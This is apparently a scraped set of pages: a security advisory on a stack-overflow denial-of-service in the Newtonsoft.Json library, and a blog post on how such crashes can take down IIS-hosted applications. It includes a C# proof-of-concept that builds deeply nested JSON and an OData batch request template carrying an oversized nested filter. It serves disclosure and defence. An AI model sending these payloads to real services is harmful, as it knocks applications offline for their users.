### 0 comments on commit `7e77bbe`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fcommit%2F7e77bbe1beccceac4fc7b174b53abfefac278b66) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from alephsecurity.com_201d612e_20250111_034734.html ===

[<-- א](/)

# Applications that use Newtonsoft.Json might be exposed to DOS vulnerability

Aleph Research Advisory

## Identifier

[ALEPH-2018004](/vulns/aleph-2018004)
## Severity

Moderate
## Products

1. Newtonsoft.Json
## Vulnerable Version

11.0.2

## Technical Details

A defect in Newtonsoft.Json (aka Json.NET) library might expose applications that use it to a DOS vulnerability.

Json.NET is the No.1 community package in terms of downloads (more than 150,000,000) in Nuget (package manager for .NET). It is used by many web applications as well as Desktop applications to handle Json - serialize, deserialize, etc.

When using this library to serialize a highly nested JSON object, a StackOverflow exception is thrown.
This exception cannot be caught and it will immediately terminate the entire process (see our [blog post](/2018/09/13/StackOverflowException/)).

This library is not vulnerable by its own, but there might be a lot of scenarios where application that uses it become vulnerable due to this issue.

For example, application that gets JSON as an input and use this library to write it in a pretty format (Indented). In this case, if the input contains a highly nested JSON, the application process will terminate and the application will be unavailable.

## Proof Of Concept

Following is a sample program that demonstrate the issue:

```
using System;
using System.IO;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace JsonTests
{
    class Program
    {
        static void Main(string[] args)
        {
            //Create a string representation of an highly nested object (JSON serialized)
            int nRep = 24000;
            string json = string.Concat(Enumerable.Repeat("{a:", nRep)) + "1" +
                          string.Concat(Enumerable.Repeat("}", nRep));

            //Parse this object (Parsing works well - no exception is being thrown)
            var parsedJson = JObject.Parse(json);

            using (var ms = new MemoryStream())
            using (var sWriter = new StreamWriter(ms))
            using (var jWriter = new JsonTextWriter(sWriter))
            {
                //Trying to serialize the object will result in StackOverflowException !!!
                parsedJson.WriteTo(jWriter);
            }

            //ToString throws StackOverflowException as well  (ToString is very unefficient - even for smaller payloads, it will occupy a lot of CPU & Memory)
            //parsedJson.ToString();

            //JsonConvert.SerializeObject throws StackOverflowException as well
            //string a = JsonConvert.SerializeObject(parsedJson);

        }
    }
}

```

## Timeline

* 22-Oct-18: Public disclosure.
* 25-Sep-18: Deadline.
* 27-Jun-18: Reported (Report directly to Newtonsoft).
* 29-May-18: Reported (Report to library owner through NuGet).
## Posts

* [It takes only one StackOverflowException to bring down an Application deployed on IIS](/2018/10/22/StackOverflowException/)  By [Gil Mirmovitch](/authors/gilm), 22-Oct 2018
## Credit

* [Gil Mirmovitch](/authors/gilm) of Aleph Research, HCL Technologies



=== Content from alephsecurity.com_65aa81fd_20250111_034734.html ===

[<-- א](/)

# It takes only one StackOverflowException to bring down an Application deployed on IIS

By [Gil Mirmovitch](/authors/gilm)

October 22, 2018
\*

 [CVE-2018-8269](/vulns/aleph-2018001) [ALEPH-2018002](/vulns/aleph-2018002) [ALEPH-2018003](/vulns/aleph-2018003) [ALEPH-2018004](/vulns/aleph-2018004)
 [ALEPH-2018005](/vulns/aleph-2018005) [ALEPH-2018006](/vulns/aleph-2018006)

\*

StackOverflowException (SOE) is a special exception in .NET as there is no way to catch it. When such an exception occurs, it immediately terminates the process.
If SOE is thrown in a web application deployed on IIS, the process that runs the application is terminated. But not to worry, IIS is very robust: it has a mechanism that automatically starts a new process when it terminates unexpectedly ([Rapid-Fail protection](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/failure)). By default, IIS will keep recovering processes until the process has been terminated 5 times in 5 minutes. At that point IIS shuts down the application pool and all applications that use this pool are shut down. The applications will be down until the pool is manually restarted.

If there is a request that consistently causes SOE, an attacker can easily bring down the application simply by sending 5 requests in 5 minutes. To make things worse, when SOE occurs, the process terminates immediately before the request is written to the log, so if you rely on IIS logs, you will not have any indication of the requests that caused the shutdown.

This is the reason why Microsoft’s documentation says that [“you should write your code to detect and prevent a stack overflow”](https://docs.microsoft.com/en-us/dotnet/api/system.stackoverflowexception#version-considerations).
So, as you are a perfect developer, follow the guidelines, and always check the depth of your recursions, there is obviously nothing to worry about.

But what if you are using a library that is not perfectly written?

Yes, there are common core libraries that are not perfectly written and contain recursive code with no depth limit.

An example of such a library is [Microsoft.Data.OData](https://www.nuget.org/packages/Microsoft.Data.OData/).
This library contains infrastructure functionality for handling OData V1-3 payloads.

OData is an application level protocol for interacting with data via RESTful web services. The protocol covers the description of data models and also querying and modifying data according to these models. Querying data is done by http parameters. One of these parameters is the **$filter**, which is used to filter elements from a data set.

This library has ~**30,000,000 downloads** in Nuget (.NET package manager).
It is used by many applications and services that expose OData API and therefore are vulnerable to DOS.

Example for vulnerabilities in common applications that are due to this issue:

* [DOS Vulnerability in SharePoint 2016 Server](/vulns/aleph-2018002)
* [DOS vulnerability in Azure Active Directory Graph API](/vulns/aleph-2018003)

In April 2018 I reported to Microsoft about a vulnerability on version 5.8.3 of this library ([CVE-2018-8269](/vulns/aleph-2018001)).
I showed that when parsing a crafted OData filter using this library, a SOE is thrown.

In this post, I will show how this vulnerability can be used to remotely shutdown an application that exposes OData V3 API, deployed on IIS.

The minimum length of the filter required to trigger the SOE depends on the thread’s stack size. On IIS 10 deployed on Windows 10 x64, the minimum payload size is ~15KB.

According to the OData standard, the filter should be sent in the request’s query parameter, called $filter.

For example: http://example.com/odata/issues?**$filter=Status+eq+Open**

IIS limits the query size to 2KB by default, so it is not possible to send a payload that will initiate SOE using such request.

But OData Standard also defines [Batch Processing](http://www.odata.org/documentation/odata-version-3-0/batch-processing/): a way to get data in a set of queries. Using batch processing, the OData filter is sent in the request’s body, and there is no limit on the length of the filter.

Here is an example of a batch request:

```
POST /odata/$batch HTTP/1.1
Content-Type: multipart/mixed; boundary=RRR
Host: example.com
Content-Length: 15000

--RRR
Content-Type: application/http
Content-Transfer-Encoding: binary

GET http://example.com/odata/issues?$filter=1+add+1+add+1+add+1+add ...

--RRR--

```

Using such a request, it is possible to send a payload that will initiate SOE.

So, if an application exposes an OData REST API (using Microsoft.AspNet.WebApi.OData and Microsoft.Data.OData), and the application supports Batch Processing, an attacker can easily shutdown the application remotely!!

In Microsoft’s “[Security Guidance for ASP.NET Web API 2 OData](https://docs.microsoft.com/en-us/aspnet/web-api/overview/odata-support-in-aspnet-web-api/odata-security-guidance)” it is recommended to apply restrictions to the filter received by the user, in order to prevent DOS attacks (heavy database queries or complex queries).

The infrastructure provides a powerful method for restricting the OData capabilities. One of the restrictions is MaxNodeCount, which restricts the number of nodes in the filter’s expression. The default value for this restriction is 100 nodes, and the user can easily change this default:

```
[EnableQuery(MaxNodeCount = 20)]
public IHttpActionResult Get()
{
    return Ok(context.Issues);
}

```

The filter expression required for initiating SOE contains thousands of nodes, so theoretically it should block the malicious request. In practice, however, the validation uses the vulnerable function to analyse the filter before it applies the restrictions and the validation itself throws the SOE and terminates the process.

This is an example of a well-written library that generally limits the depth for recursive paths in the code, but still misses at least one path (I tried some other nested expressions, but I got a proper error: “Recursion depth exceeded allowed limit.”). It looks as though the developers that wrote this library followed the guidelines, but simply missed one path, and this is enough to enable the vulnerability.

I encountered a similar issue in some other very common libraries and also in the .NET Framework itself:

* [Applications that use Newtonsoft.Json might be exposed to DOS vulnerability](/vulns/aleph-2018004)
* [Potential DOS vulnerability in applications that use ASP.NET Web API](/vulns/aleph-2018005)
* [Potential DOS vulnerability in WCF services](/vulns/aleph-2018006)

## Conclusions

The consequences of SOE in .NET are severe, as it immediately terminates the process, but it is often not a simple matter to limit recursion depth in all recursive paths.

Is it really necessary to terminate the process in the case of stack overflow?

In early versions of .NET (1.0 and 1.1), SOE did not terminate the process. It was simply another catchable exception, though I assume it caused a lot of stability issues. Instead of solving these issues, Microsoft chose the simplest solution: terminating the process.

By doing this Microsoft in effect passed the responsibility on to the developer: [“Starting with the .NET Framework 2.0, you can’t catch a StackOverflowException object with a try/catch block, and the corresponding process is terminated by default. Consequently, you should write your code to detect and prevent a stack overflow.”](https://msdn.microsoft.com/en-us/library/system.stackoverflowexception.aspx#Remarks)

## Alternative approach

In Java, stack overflow does not terminate the process, and in most of the cases it is possible to recover from stack overflow without any consequences.
So how Java does it?

Java language differentiates between Exception and Error.

Exception “indicates conditions that a reasonable application might want to catch”, while Error “indicates serious problems that a reasonable application should not try to catch”.

StackOverflowError is a type of Error, and therefore is not caught by a general exception catch. Libraries and web applications should not catch and handle errors, they should leave it to the hosting code (the server for a web application).

The advantage of this architecture is that the StackOverflowError is handled outside the recursive loop, so the code that handles it is executed after unwinding all the stack that was involved in the loop and there is enough space to handle the error.

OpenJDK implements some mechanisms to gracefully handle stack overflow. A few pages at the bottom of the stack are reserved for handling stack overflow (yellow zone). When a new function is invoked, before actually allocating a frame on the stack, a test is done to verify that the new frame will not reach the yellow zone (Stack banging). In the case of failure, the yellow zone is added to the stack and a StackOverflowError is thrown. The yellow zone pages will be available for the creation and handling of the StackOverflowError.

Recently a new feature was added to reduce the chance of deadlocks in case of stack overflow: http://openjdk.java.net/jeps/270

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)


